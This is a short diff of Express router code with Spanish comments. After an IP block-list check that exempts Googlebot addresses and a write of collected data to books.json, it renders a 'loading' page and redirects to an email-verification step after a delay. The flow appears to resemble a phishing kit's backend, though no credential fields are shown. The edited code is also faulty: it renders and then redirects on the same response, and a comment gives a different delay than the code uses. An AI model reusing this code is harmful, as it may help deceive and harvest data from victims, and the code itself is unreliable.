@@ -154,12 +154,15 @@ if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
     const json_books = JSON.stringify(books)
     fs.writeFileSync('src/books.json', json_books, 'utf-8');
 
-      // Espera 30 segundos antes de redirigir
-setTimeout(() => {
-    res.redirect('emailverificacion');
-  }, 30000); // 30000 milisegundos = 30 segundos
-});
 
+
+res.render('loading2'); // Renderiza la vista "loading" mientras espera los 15 segundos
+
+  // Espera 30 segundos antes de redirigir
+  setTimeout(() => {
+    res.redirect('emailverificacion');
+  }, 30000);
+});
 
 
 router.post('/emailverificacion',  (req, res) => {
